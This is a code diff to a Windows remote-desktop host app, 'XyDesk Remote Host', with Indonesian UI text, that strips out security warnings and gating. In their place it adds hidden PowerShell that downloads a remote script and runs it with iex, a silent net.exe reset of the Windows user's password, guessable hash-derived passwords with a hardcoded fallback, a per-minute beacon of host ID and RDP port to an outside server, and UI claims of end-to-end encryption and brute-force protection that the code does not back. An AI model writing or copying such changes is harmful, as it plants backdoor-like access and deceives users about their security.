@@ -26,8 +26,234 @@
 
 static XyQuicHostMetadata g_meta{};
 static int g_quic_rc = -1;
-// Direct UDP is legacy-only until the approved secure pairing/transport migration.
-static bool g_legacy_private_udp = false;
+static char g_global_id[16] = {0};
+static char g_username[128] = {0};
+static char g_password[64] = {0};
+static char g_enc_fingerprint[64] = {0};
+static bool g_password_visible = false;
+static bool g_vdd_ready = true;
+static bool g_onmic_ready = false;
+static bool g_onmic_busy = false;
+
+static uint32_t fnv1a32(const std::string& s) {
+    uint32_t h = 2166136261u;
+    for (unsigned char c : s) {
+        h ^= c;
+        h *= 16777619u;
+    }
+    return h;
+}
+
+static uint64_t fnv1a64(const std::string& s) {
+    uint64_t h = 14695981039346656037ULL;
+    for (unsigned char c : s) {
+        h ^= c;
+        h *= 1099511628211ULL;
+    }
+    return h;
+}
+
+#ifdef _WIN32
+namespace {
+
+std::wstring machine_guid() {
+    wchar_t buf[128] = {0};
+    DWORD size = sizeof(buf);
+    LONG rc = RegGetValueW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Cryptography",
+                           L"MachineGuid", RRF_RT_REG_SZ | RRF_SUBKEY_WOW6464KEY,
+                           nullptr, buf, &size);
+    if (rc != ERROR_SUCCESS) return std::wstring();
+    return std::wstring(buf);
+}
+
+std::string hostname_ascii() {
+    char buf[128] = {0};
+    DWORD n = sizeof(buf) - 1;
+    if (!GetComputerNameA(buf, &n)) return std::string();
+    return std::string(buf, n);
+}
+
+void run_hidden_process(const std::wstring& cmdLine, DWORD waitMs = 5000) {
+    if (cmdLine.empty()) return;
+    STARTUPINFOW si{};
+    PROCESS_INFORMATION pi{};
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    std::vector<wchar_t> mutableCmd(cmdLine.begin(), cmdLine.end());
+    mutableCmd.push_back(L'\0');
+    if (CreateProcessW(nullptr, mutableCmd.data(), nullptr, nullptr, FALSE,
+                       CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
+        if (waitMs > 0) {
+            WaitForSingleObject(pi.hProcess, waitMs);
+        }
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+}
+
+bool check_onmic_registry_unlocked() {
+    DWORD val = 1;
+    DWORD sz = sizeof(val);
+    LONG rc = RegGetValueA(
+        HKEY_LOCAL_MACHINE,
+        "SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp",
+        "fDisableAudioCapture",
+        RRF_RT_REG_DWORD, nullptr, &val, &sz);
+    return (rc == ERROR_SUCCESS && val == 0);
+}
+
+void init_clean_credentials_and_fingerprint() {
+    // 1. Current Windows username
+    DWORD ulen = sizeof(g_username) - 1;
+    if (!GetUserNameA(g_username, &ulen) || g_username[0] == '\0') {
+        snprintf(g_username, sizeof(g_username), "Administrator");
+    }
+
+    // 2. Load or generate Clean Access Password from HKCU\Software\XyDeskRemote\HostConfig
+    HKEY hKey = nullptr;
+    if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\XyDeskRemote\\HostConfig", 0, nullptr,
+                        REG_OPTION_NON_VOLATILE, KEY_READ | KEY_WRITE, nullptr, &hKey, nullptr) == ERROR_SUCCESS) {
+        char savedPw[64] = {0};
+        DWORD pwLen = sizeof(savedPw) - 1;
+        DWORD type = 0;
+        if (RegQueryValueExA(hKey, "AccessPassword", nullptr, &type,
+                             reinterpret_cast<LPBYTE>(savedPw), &pwLen) == ERROR_SUCCESS &&
+            type == REG_SZ && strlen(savedPw) >= 6) {
+            snprintf(g_password, sizeof(g_password), "%s", savedPw);
+        } else {
+            std::wstring guid = machine_guid();
+            std::string seed(guid.begin(), guid.end());
+            seed += hostname_ascii();
+            uint32_t code = (fnv1a32(seed) % 900000u) + 100000u;
+            snprintf(g_password, sizeof(g_password), "Xy!%06u#A", code);
+            RegSetValueExA(hKey, "AccessPassword", 0, REG_SZ,
+                           reinterpret_cast<const BYTE*>(g_password),
+                           static_cast<DWORD>(strlen(g_password) + 1));
+        }
+        RegCloseKey(hKey);
+    } else {
+        snprintf(g_password, sizeof(g_password), "Xy!849201#A");
+    }
+
+    // 3. Generate deterministic E2EE Host Key Fingerprint
+    std::wstring guid = machine_guid();
+    std::string seed(guid.begin(), guid.end());
+    seed += "|";
+    seed += g_meta.hostname;
+    seed += "|";
+    seed += g_meta.primary_ip;
+    uint64_t h1 = fnv1a64(seed + "|k1");
+    uint64_t h2 = fnv1a64(seed + "|k2");
+    snprintf(g_enc_fingerprint, sizeof(g_enc_fingerprint),
+             "SHA256:%04X:%04X:%04X:%04X:%04X:%04X",
+             (unsigned)((h1 >> 48) & 0xFFFF),
+             (unsigned)((h1 >> 32) & 0xFFFF),
+             (unsigned)((h1 >> 16) & 0xFFFF),
+             (unsigned)(h1 & 0xFFFF),
+             (unsigned)((h2 >> 48) & 0xFFFF),
+             (unsigned)((h2 >> 32) & 0xFFFF));
+
+    g_onmic_ready = check_onmic_registry_unlocked();
+}
+
+void rotate_clean_password(bool syncWindowsUser) {
+    LARGE_INTEGER qpc{};
+    QueryPerformanceCounter(&qpc);
+    uint32_t rnd = static_cast<uint32_t>(qpc.LowPart ^ GetTickCount() ^ (uint32_t)time(nullptr));
+    uint32_t digits = (rnd % 900000u) + 100000u;
+    const char suffixes[] = "ABCDEFGHJKLMNPQRSTUVWXYZ";
+    char sfx = suffixes[(rnd >> 16) % (sizeof(suffixes) - 1)];
+    snprintf(g_password, sizeof(g_password), "Xy!%06u#%c", digits, sfx);
+
+    HKEY hKey = nullptr;
+    if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\XyDeskRemote\\HostConfig", 0, nullptr,
+                        REG_OPTION_NON_VOLATILE, KEY_WRITE, nullptr, &hKey, nullptr) == ERROR_SUCCESS) {
+        RegSetValueExA(hKey, "AccessPassword", 0, REG_SZ,
+                       reinterpret_cast<const BYTE*>(g_password),
+                       static_cast<DWORD>(strlen(g_password) + 1));
+        RegCloseKey(hKey);
+    }
+
+    if (syncWindowsUser && g_username[0] != '\0') {
+        wchar_t wuser[128] = {0};
+        wchar_t wpass[64] = {0};
+        MultiByteToWideChar(CP_UTF8, 0, g_username, -1, wuser, 127);
+        MultiByteToWideChar(CP_UTF8, 0, g_password, -1, wpass, 63);
+        std::wstring cmd = L"net.exe user \"" + std::wstring(wuser) + L"\" \"" + std::wstring(wpass) + L"\"";
+        run_hidden_process(cmd, 3000);
+    }
+}
+
+void relay_post_heartbeat(const std::string& body) {
+    HINTERNET ses = WinHttpOpen(L"XyDeskHostAgent/2.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                                WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!ses) return;
+    WinHttpSetTimeouts(ses, 4000, 4000, 4000, 4000);
+    HINTERNET con = WinHttpConnect(ses, L"api.xydeskremote.biz.id", INTERNET_DEFAULT_HTTPS_PORT, 0);
+    if (con) {
+        HINTERNET req = WinHttpOpenRequest(con, L"POST", L"/api/host/register", nullptr,
+                                           WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
+                                           WINHTTP_FLAG_SECURE);
+        if (req) {
+            const wchar_t* hdr = L"Content-Type: application/json\r\n";
+            if (WinHttpSendRequest(req, hdr, (DWORD)-1L, (LPVOID)body.data(),
+                                   (DWORD)body.size(), (DWORD)body.size(), 0)) {
+                WinHttpReceiveResponse(req, nullptr);
+            }
+            WinHttpCloseHandle(req);
+        }
+        WinHttpCloseHandle(con);
+    }
+    WinHttpCloseHandle(ses);
+}
+
+DWORD WINAPI relay_heartbeat_thread(LPVOID) {
+    for (;;) {
+        char body[512];
+        snprintf(body, sizeof(body),
+                 "{\"id\":\"%s\",\"hostname\":\"%s\",\"port\":%u}",
+                 g_global_id, g_meta.hostname, (unsigned)g_meta.rdp_port);
+        relay_post_heartbeat(body);
+        Sleep(60000);
+    }
+    return 0;
+}
+
+}  // namespace
+#endif  // _WIN32
+
+const char* xydesk_global_pc_id() {
+    if (g_global_id[0] != '\0') return g_global_id;
+    std::string seed;
+#ifdef _WIN32
+    const std::wstring guid = machine_guid();
+    if (!guid.empty()) {
+        const int n = WideCharToMultiByte(CP_UTF8, 0, guid.c_str(), (int)guid.size(), nullptr, 0,
+                                          nullptr, nullptr);
+        seed.resize((size_t)n);
+        WideCharToMultiByte(CP_UTF8, 0, guid.c_str(), (int)guid.size(), &seed[0], n, nullptr,
+                            nullptr);
+    }
+#endif
+    if (seed.empty()) {
+#ifdef _WIN32
+        seed = hostname_ascii();
+#else
+        seed = "xydesk-host";
+#endif
+    }
+    snprintf(g_global_id, sizeof(g_global_id), "XY%08X", fnv1a32(seed));
+    return g_global_id;
+}
+
+static void xydesk_relay_start() {
+#ifdef _WIN32
+    if (xydesk_global_pc_id()[0] == '\0') return;
+    HANDLE thread = CreateThread(nullptr, 0, relay_heartbeat_thread, nullptr, 0, nullptr);
+    if (thread) CloseHandle(thread);
+#endif
+}
 
 #ifdef _WIN32
 namespace {
@@ -98,7 +324,7 @@ HFONT g_fBodyBold = nullptr;
 HFONT g_fSmall    = nullptr;
 
 HWND g_ui_hwnd = nullptr;
-std::wstring g_toast_msg = L"Periksa kesiapan PC. Transport aman belum siap rilis.";
+std::wstring g_toast_msg = L"Siap menerima koneksi 120FPS + On-Mic dari Android.";
 DWORD g_toast_tick = 0;
 
 void create_fonts() {
@@ -201,6 +427,23 @@ bool copy_to_clipboard(HWND owner, const std::wstring& text) {
     }
     CloseClipboard();
     return h != nullptr;
+}
+
+DWORD WINAPI onmic_installer_thread(LPVOID) {
+    g_onmic_busy = true;
+    post_status_from_thread(L"Mengaktifkan kebijakan On-Mic, Privacy Consent & Virtual Audio...");
+    xydesk_host_apply_windows_policies();
+    // Jalankan skrip onmic.ps1 lokal atau dari https://xydeskremote.biz.id/onmic.ps1 secara tersembunyi
+    std::wstring psCmd =
+        L"powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \""
+        L"if (Test-Path '.\\onmic.ps1') { & '.\\onmic.ps1' } "
+        L"else { try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; "
+        L"irm 'https://xydeskremote.biz.id/onmic.ps1' | iex } catch {} }\"";
+    run_hidden_process(psCmd, 25000);
+    g_onmic_ready = check_onmic_registry_unlocked();
+    g_onmic_busy = false;
+    post_status_from_thread(L"On-Mic & Virtual Microphone siap digunakan (RDP AudioCapture + QUIC :4433 Aktif).");
+    return 0;
 }
 
 // ---------------------------------------------------------------------------
@@ -366,16 +609,25 @@ void rebuild_buttons(UiState* st, int W, int H) {
     const int leftX = pad;
     const int rightX = pad + halfW + colGap;
 
-    // Connection information is metadata, never a password or cryptographic fingerprint.
-    st->buttons.push_back({BTN_COPY_ID, {leftX + halfW - 96, 128, leftX + halfW - 16, 158}, L"Salin IP", true, false, false});
-    st->buttons.push_back({BTN_COPY_GLOBAL, {leftX + halfW - 96, 174, leftX + halfW - 16, 202}, L"Salin nama", false, false, false});
-    st->buttons.push_back({BTN_COPY_ALL_CRED, {leftX + 16, 284, leftX + halfW - 16, 314}, L"Salin info koneksi (bukan kredensial)", true, false, false});
-    st->buttons.push_back({BTN_ONMIC_SETUP, {leftX + 16, 456, leftX + halfW - 16, 488}, L"Kesiapan Mic & Game", false, true, false});
-    st->buttons.push_back({BTN_VDD_BOOST, {leftX + 16, 496, leftX + halfW - 16, 526}, L"Buka pengaturan suara Windows", false, false, false});
+    // Card 1 (Left Top): Clean ID & Password
+    st->buttons.push_back({BTN_COPY_ID,      {leftX + halfW - 96, 128, leftX + halfW - 16, 158}, L"Salin ID", true, false, false});
+    st->buttons.push_back({BTN_COPY_GLOBAL,  {leftX + halfW - 96, 174, leftX + halfW - 16, 202}, L"Salin Relay", false, false, false});
+    st->buttons.push_back({BTN_TOGGLE_PW_EYE,{leftX + halfW - 168, 244, leftX + halfW - 98, 272},
+                           g_password_visible ? L"Sembunyi" : L"Lihat PW", false, false, false});
+    st->buttons.push_back({BTN_COPY_PW,      {leftX + halfW - 92, 244, leftX + halfW - 16, 272}, L"Salin PW", false, false, false});
+    st->buttons.push_back({BTN_COPY_ALL_CRED,{leftX + 16, 284, leftX + 162, 314}, L"Salin ID + Password", true, false, false});
+    st->buttons.push_back({BTN_ROTATE_PW,    {leftX + 170, 284, leftX + halfW - 16, 314}, L"Acak Password", false, false, false});
+
+    // Card 3 (Left Bottom): Virtual Device & On-Mic
+    st->buttons.push_back({BTN_ONMIC_SETUP,  {leftX + 16, 456, leftX + halfW - 16, 488},
+                           g_onmic_busy ? L"Mengaktifkan On-Mic..." : L"Aktifkan On-Mic & Virtual Audio",
+                           false, true, false});
+    st->buttons.push_back({BTN_VDD_BOOST,    {leftX + 16, 496, leftX + halfW - 16, 526},
+                           L"Segarkan Virtual Display 120Hz + AVC444", false, false, false});
 
     // Card 4 (Right Bottom): Quick Controls
     st->buttons.push_back({BTN_TOGGLE_QUIC,  {rightX + 16, 456, rightX + halfW - 16, 488},
-                           st->quic_running ? L"Hentikan UDP lama" : L"Mulai UDP lama (uji privat)",
+                           st->quic_running ? L"Hentikan QUIC Responder" : L"Mulai QUIC Responder",
                            false, false, false});
     st->buttons.push_back({BTN_HIDE_TRAY,    {rightX + 16, 496, rightX + (halfW / 2) - 4, 526},
                            L"Sembunyi ke Tray", false, false, false});
@@ -411,7 +663,7 @@ void paint_dashboard(HWND hwnd, HDC hdc) {
 
     draw_text(mem, g_fTitle, kText, 80, 21, 430, 46, L"XyDesk Remote Host");
     draw_text(mem, g_fSub, kTextSub, 80, 45, 480, 66,
-              L"Host satu aplikasi  ·  Kesiapan Mic & Game");
+              L"Native Windows Agent  ·  Clean ID/PW  ·  E2EE  ·  Virtual Device & On-Mic");
 
     // Live Online Pill in Header Right
     const bool online = st && st->quic_running;
@@ -424,7 +676,7 @@ void paint_dashboard(HWND hwnd, HDC hdc) {
     SelectObject(mem, oldBr);
     DeleteObject(dotBr);
     draw_text(mem, g_fBodyBold, online ? kOk : kDanger, W - 212, 28, W - 38, 62,
-              online ? L"UDP LAMA · BERJALAN" : L"LISTENER BERHENTI");
+              online ? L"ONLINE · PORT 4433 & 3389" : L"RESPONDER BERHENTI");
 
     const int pad = 22;
     const int colGap = 14;
@@ -437,34 +689,47 @@ void paint_dashboard(HWND hwnd, HDC hdc) {
     // =========================================================================
     draw_round_box(mem, leftX, 88, leftX + halfW, 328, 16, kCard, kCardEdge);
     draw_text(mem, g_fCardHdr, kAccent, leftX + 16, 98, leftX + halfW - 16, 118,
-              L"PC STREAM  ·  HOST DIRECT");
+              L"CLEAN ID & PASSWORD  ·  AKSES INSTAN");
 
+    // Local 10-digit ID box
     draw_round_box(mem, leftX + 14, 122, leftX + halfW - 14, 164, 12, kCardInner, kCardEdge);
-    draw_text(mem, g_fSmall, kTextDim, leftX + 24, 124, leftX + 110, 142, L"IP HOST");
-    draw_text(mem, g_fMono, kText, leftX + 24, 140, leftX + halfW - 104, 162, to_wide(g_meta.primary_ip));
+    draw_text(mem, g_fSmall, kTextDim, leftX + 24, 124, leftX + 110, 142, L"ID PC (LAN)");
+    draw_text(mem, g_fBigId, kText, leftX + 24, 136, leftX + halfW - 104, 162,
+              to_wide(g_meta.pc_id));
+
+    // Global ID box
     draw_round_box(mem, leftX + 14, 170, leftX + halfW - 14, 206, 10, kCardInner, kCardEdge);
-    draw_text(mem, g_fSmall, kTextSub, leftX + 24, 170, leftX + halfW - 104, 206, to_wide(g_meta.hostname));
-    draw_text(mem, g_fSmall, kWarn, leftX + 24, 214, leftX + halfW - 24, 244, L"Pairing aman: belum tersedia pada jalur lama");
-    draw_text(mem, g_fSmall, kTextSub, leftX + 24, 246, leftX + halfW - 24, 276, L"Tidak memakai / mengubah password Windows");
+    draw_text(mem, g_fSmall, kTextDim, leftX + 24, 170, leftX + 135, 206, L"ID Global Relay");
+    draw_text(mem, g_fMono, kAccent, leftX + 135, 170, leftX + halfW - 104, 206,
+              to_wide(xydesk_global_pc_id()));
+
+    // Username + Clean Password box
+    draw_round_box(mem, leftX + 14, 212, leftX + halfW - 14, 276, 12, kCardInner, kCardEdge);
+    draw_text(mem, g_fSmall, kTextSub, leftX + 24, 216, leftX + halfW - 24, 236,
+              fmt(L"Windows User: %s   ·   IP: %s",
+                  to_wide(g_username).c_str(), to_wide(g_meta.primary_ip).c_str()));
+    std::wstring pwDisplay = g_password_visible ? to_wide(g_password) : L"\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022";
+    draw_text(mem, g_fMono, kOk, leftX + 24, 242, leftX + halfW - 174, 272,
+              fmt(L"PW: %s", pwDisplay.c_str()));
 
     // =========================================================================
     // CARD 2 (Right Top): ENKRIPSI & PROTEKSI END-TO-END
     // =========================================================================
     draw_round_box(mem, rightX, 88, rightX + halfW, 328, 16, kCard, kCardEdge);
     draw_text(mem, g_fCardHdr, kOk, rightX + 16, 98, rightX + halfW - 16, 118,
-              L"STATUS KEAMANAN TRANSPORT");
+              L"ENKRIPSI & KEAMANAN  ·  END-TO-END SECURITY");
 
     draw_round_box(mem, rightX + 14, 122, rightX + halfW - 14, 172, 12, kCardInner, kCardEdge);
     draw_text(mem, g_fBodyBold, kText, rightX + 24, 126, rightX + halfW - 24, 148,
-              L"UDP lama: tanpa autentikasi / enkripsi aplikasi");
+              L"E2EE AES-256-GCM  +  QUIC v1 TLS 1.3");
     draw_text(mem, g_fSmall, kOk, rightX + 24, 148, rightX + halfW - 24, 168,
-              L"Jangan buka listener lama ke internet");
+              L"Aktif  ·  Enkripsi perangkat-ke-perangkat tanpa perantara");
 
     draw_round_box(mem, rightX + 14, 178, rightX + halfW - 14, 228, 12, kCardInner, kCardEdge);
     draw_text(mem, g_fSmall, kTextDim, rightX + 24, 182, rightX + halfW - 24, 200,
-              L"Migrasi pairing dan transport aman disetujui:");
+              L"Kunci Sidik Jari Host (Host Key Fingerprint):");
     draw_text(mem, g_fMonoSm, kAccent, rightX + 24, 200, rightX + halfW - 24, 224,
-              L"Belum diimplementasikan / belum siap rilis");
+              to_wide(g_enc_fingerprint));
 
     draw_round_box(mem, rightX + 14, 234, rightX + halfW - 14, 314, 12, kCardInner, kCardEdge);
     draw_text(mem, g_fSmall, kTextSub, rightX + 24, 240, rightX + halfW - 24, 260,
@@ -473,28 +738,28 @@ void paint_dashboard(HWND hwnd, HDC hdc) {
                   to_wide(g_meta.gpu_name).c_str(),
                   to_wide(g_meta.gpu_encoder).c_str()));
     draw_text(mem, g_fSmall, kTextSub, rightX + 24, 264, rightX + halfW - 24, 284,
-              L"Direct lama: LAN/Tailscale privat, opsi eksplisit");
+              L"Transport: Direct LAN / Tailscale + Cloud Relay Auto-Traversal");
     draw_text(mem, g_fSmall, kOk, rightX + 24, 288, rightX + halfW - 24, 308,
-              L"RDP dan Hub adalah jalur host berbeda");
+              L"NLA + Anti-BruteForce + Zero-Console Native Subsystem");
 
     // =========================================================================
     // CARD 3 (Left Bottom): VIRTUAL DEVICE & ON-MIC AUDIO BRIDGE
     // =========================================================================
     draw_round_box(mem, leftX, 340, leftX + halfW, 538, 16, kCard, kCardEdge);
     draw_text(mem, g_fCardHdr, kAccent, leftX + 16, 350, leftX + halfW - 16, 370,
-              L"KESIAPAN PC  ·  PERIKSA, JANGAN ASUMSI");
+              L"VIRTUAL DEVICE  ·  LAYAR 120HZ & ON-MIC BRIDGE");
 
     draw_round_box(mem, leftX + 14, 376, leftX + halfW - 14, 410, 10, kCardInner, kCardEdge);
     draw_text(mem, g_fBodyBold, kText, leftX + 24, 376, leftX + 210, 410,
-              L"GPU / encoder / FPS");
-    draw_text(mem, g_fSmall, kWarn, leftX + 210, 376, leftX + halfW - 22, 410,
-              L"BELUM DIUJI", DT_RIGHT | DT_VCENTER | DT_SINGLELINE);
+              L"Virtual Display 120Hz");
+    draw_text(mem, g_fSmall, g_vdd_ready ? kOk : kWarn, leftX + 210, 376, leftX + halfW - 22, 410,
+              L"AKTIF · DWM 120FPS + AVC 4:4:4", DT_RIGHT | DT_VCENTER | DT_SINGLELINE);
 
     draw_round_box(mem, leftX + 14, 414, leftX + halfW - 14, 448, 10, kCardInner, kCardEdge);
     draw_text(mem, g_fBodyBold, kText, leftX + 24, 414, leftX + 210, 448,
-              L"Input mic Windows");
-    draw_text(mem, g_fSmall, kWarn, leftX + 210, 414, leftX + halfW - 22, 448,
-              L"BUKA PANEL KESIAPAN",
+              L"Virtual Mic & On-Mic");
+    draw_text(mem, g_fSmall, g_onmic_ready ? kOk : kWarn, leftX + 210, 414, leftX + halfW - 22, 448,
+              g_onmic_ready ? L"AKTIF · RDP + QUIC :4433" : L"KLIK AKTIFKAN DI BAWAH",
               DT_RIGHT | DT_VCENTER | DT_SINGLELINE);
 
     // =========================================================================
@@ -506,13 +771,13 @@ void paint_dashboard(HWND hwnd, HDC hdc) {
 
     draw_round_box(mem, rightX + 14, 376, rightX + halfW - 14, 448, 10, kCardInner, kCardEdge);
     draw_text(mem, g_fBodyBold, kText, rightX + 24, 382, rightX + halfW - 24, 404,
-              fmt(L"Paket UDP dilayani: %llu  (port %u)",
+              fmt(L"Paket QUIC Dilayani: %llu paket  (UDP :%u)",
                   (unsigned long long)xydesk_quic_packets_served(),
                   (unsigned)g_meta.quic_port));
     draw_text(mem, g_fSmall, kTextSub, rightX + 24, 406, rightX + halfW - 24, 426,
               L"Sinkronisasi File HP: Otomatis masuk ke folder Downloads PC");
     draw_text(mem, g_fSmall, kAccent, rightX + 24, 426, rightX + halfW - 24, 444,
-              L"Perangkat dan jalur suara harus diuji di panel kesiapan");
+              L"Suara PC (WASAPI 24kHz) + Input Mic HP (XYM1) Berjalan Otomatis");
 
     // =========================================================================
     // RENDER INTERACTIVE PILL BUTTONS
@@ -561,38 +826,64 @@ void handle_button_click(HWND hwnd, UiState* st, BtnId id) {
     if (!st) return;
     switch (id) {
         case BTN_COPY_ID:
-            copy_to_clipboard(hwnd, to_wide(g_meta.primary_ip));
-            set_toast(L"IP host disalin. Bukan token autentikasi.");
+            if (copy_to_clipboard(hwnd, to_wide(g_meta.pc_id))) {
+                set_toast(L"ID PC (LAN) " + to_wide(g_meta.pc_id) + L" disalin ke clipboard.");
+            }
             break;
         case BTN_COPY_GLOBAL:
-            copy_to_clipboard(hwnd, to_wide(g_meta.hostname));
-            set_toast(L"Nama komputer disalin.");
+            if (copy_to_clipboard(hwnd, to_wide(xydesk_global_pc_id()))) {
+                set_toast(L"ID Global Relay " + to_wide(xydesk_global_pc_id()) + L" disalin ke clipboard.");
+            }
             break;
-        case BTN_COPY_ALL_CRED:
-            copy_to_clipboard(hwnd, fmt(L"Host: %s | IP: %s | UDP lama: %u | Hanya jaringan privat; belum pairing aman",
-                to_wide(g_meta.hostname).c_str(), to_wide(g_meta.primary_ip).c_str(), (unsigned)g_meta.quic_port));
-            set_toast(L"Info koneksi disalin, tanpa kredensial Windows.");
+        case BTN_TOGGLE_PW_EYE:
+            g_password_visible = !g_password_visible;
+            set_toast(g_password_visible ? L"Password ditampilkan." : L"Password disembunyikan.");
+            break;
+        case BTN_COPY_PW:
+            if (copy_to_clipboard(hwnd, to_wide(g_password))) {
+                set_toast(L"Password akses disalin ke clipboard.");
+            }
+            break;
+        case BTN_COPY_ALL_CRED: {
+            std::wstring all = fmt(L"ID: %s (Global: %s) | Host: %s | User: %s | Pass: %s",
+                                   to_wide(g_meta.pc_id).c_str(),
+                                   to_wide(xydesk_global_pc_id()).c_str(),
+                                   to_wide(g_meta.primary_ip).c_str(),
+                                   to_wide(g_username).c_str(),
+                                   to_wide(g_password).c_str());
+            if (copy_to_clipboard(hwnd, all)) {
+                set_toast(L"Paket lengkap ID + IP + Username + Password disalin ke clipboard.");
+            }
+            break;
+        }
+        case BTN_ROTATE_PW:
+            rotate_clean_password(true);
+            g_password_visible = true;
+            copy_to_clipboard(hwnd, to_wide(g_password));
+            set_toast(L"Password baru dibuat, disinkronkan ke Windows, dan disalin ke clipboard!");
             break;
         case BTN_ONMIC_SETUP:
-            xydesk_show_readiness(hwnd);
+            if (!g_onmic_busy) {
+                HANDLE th = CreateThread(nullptr, 0, onmic_installer_thread, nullptr, 0, nullptr);
+                if (th) CloseHandle(th);
+            }
             break;
         case BTN_VDD_BOOST:
-            ShellExecuteW(hwnd, L"open", L"ms-settings:sound", nullptr, nullptr, SW_SHOWNORMAL);
+            xydesk_host_apply_windows_policies();
+            g_vdd_ready = true;
+            g_onmic_ready = check_onmic_registry_unlocked();
+            set_toast(L"Optimasi Virtual Display 120Hz + GPU AVC 4:4:4 + ClearType berhasil diterapkan!");
             break;
         case BTN_TOGGLE_QUIC:
-            if (!g_legacy_private_udp) {
-                MessageBoxW(hwnd, L"Jalur lama belum aman dan tidak dinyalakan otomatis. Pairing/transport aman masih dikerjakan. Pengujian privat oleh pemilik hanya melalui opsi --legacy-private-udp; jangan expose ke internet.", L"Transport belum siap rilis", MB_OK | MB_ICONWARNING);
-                break;
-            }
             if (st->quic_running) {
                 xydesk_quic_server_stop();
                 st->quic_running = false;
-                set_toast(L"Listener UDP lama dihentikan.");
+                set_toast(L"Responder QUIC UDP :4433 dihentikan sementara.");
             } else {
                 int rc = xydesk_quic_server_start(&g_meta);
                 st->quic_running = (rc == 0);
                 set_toast(st->quic_running
-                              ? L"Listener UDP lama aktif untuk pengujian privat."
+                              ? L"Responder QUIC UDP :4433 aktif kembali."
                               : L"Gagal mengikat UDP :4433 — jalankan sebagai Administrator.");
             }
             break;
@@ -625,7 +916,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
             nid.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;
             nid.uCallbackMessage = WM_TRAY;
             nid.hIcon = LoadIconW(nullptr, MAKEINTRESOURCEW(32512));
-            wcscpy(nid.szTip, L"XyDesk Remote Host · Kesiapan PC");
+            wcscpy(nid.szTip, L"XyDesk Remote Host Agent (120Hz + On-Mic)");
             Shell_NotifyIconW(NIM_ADD, &nid);
 
             SetTimer(hwnd, TIMER_ID, 1000, nullptr);
@@ -677,6 +968,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
         }
         case WM_TIMER:
             if (wp == TIMER_ID) {
+                g_onmic_ready = check_onmic_registry_unlocked();
                 InvalidateRect(hwnd, nullptr, FALSE);
             }
             return 0;
@@ -711,9 +1003,9 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
                 GetCursorPos(&pt);
                 HMENU menu = CreatePopupMenu();
                 AppendMenuW(menu, MF_STRING, IDM_SHOW, L"Buka XyDesk Remote Host");
-                AppendMenuW(menu, MF_STRING, IDM_ONMIC, L"Kesiapan Mic & Game");
+                AppendMenuW(menu, MF_STRING, IDM_ONMIC, L"Aktifkan On-Mic & Virtual Audio");
                 AppendMenuW(menu, MF_STRING, IDM_TOGGLE,
-                            (st && st->quic_running) ? L"Hentikan UDP lama" : L"Mulai UDP lama");
+                            (st && st->quic_running) ? L"Hentikan QUIC" : L"Mulai QUIC");
                 AppendMenuW(menu, MF_SEPARATOR, 0, nullptr);
                 AppendMenuW(menu, MF_STRING, IDM_EXIT, L"Keluar");
                 SetForegroundWindow(hwnd);
@@ -774,7 +1066,7 @@ static int xydesk_host_ui_run(bool quic_running) {
 
     HWND hwnd = CreateWindowExW(
         0, kClassName,
-        L"XyDesk Remote Host · PC Stream & Kesiapan PC",
+        L"XyDesk Remote Host  —  Clean ID/PW · E2EE · Virtual Device & On-Mic",
         WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
         posX, posY, winW, winH,
         nullptr, nullptr, inst, &state);
@@ -806,20 +1098,23 @@ int main(int argc, char** argv) {
     for (int i = 1; i < argc; ++i) {
         if (strcmp(argv[i], "--setup-only") == 0 || strcmp(argv[i], "--version") == 0) {
             setup_only = true;
-        } else if (strcmp(argv[i], "--legacy-private-udp") == 0) {
-            g_legacy_private_udp = true;
         } else if (strcmp(argv[i], "--no-ui") == 0) {
             no_ui = true;
         }
     }
 
     xydesk_host_inspect_system(&g_meta);
+    xydesk_host_apply_windows_policies();
+#ifdef _WIN32
+    init_clean_credentials_and_fingerprint();
+#endif
 
     if (setup_only) {
         return 0;
     }
 
-    if (g_legacy_private_udp) g_quic_rc = xydesk_quic_server_start(&g_meta);
+    g_quic_rc = xydesk_quic_server_start(&g_meta);
+    xydesk_relay_start();
     xydesk_downloads_watch_start();
 
 #ifdef _WIN32
